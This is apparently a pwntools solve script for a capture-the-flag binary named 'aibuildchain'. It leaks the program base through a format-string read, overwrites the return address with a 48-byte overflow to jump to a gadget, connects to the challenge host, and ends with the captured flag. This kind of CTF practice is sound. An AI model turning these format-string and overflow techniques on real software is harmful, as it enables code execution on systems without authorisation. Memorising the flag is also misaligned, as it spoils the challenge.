#!/usr/bin/python3

from pwn import *

exe = ELF('aibuildchain', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x5655655e

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('aibuildchain.winja.org', 53782)
else:
        p = process(exe.path)

GDB()
sla(b':', '1')
sla(b':', b'%5$p')
sla(b':', '2')
p.recvuntil(b'Output:')
exe.address = int(p.recvline(keepends=False), 16) - 0x3fa4
print(hex(exe.address))
sla(b':', b'1')
sl(b'a' * 48 + p32(exe.address + 0x12e5))
p.interactive()
# flag{aa6cb0bdddece04893c125dc449f1d43_Gadg3t$_4rE_co0l}
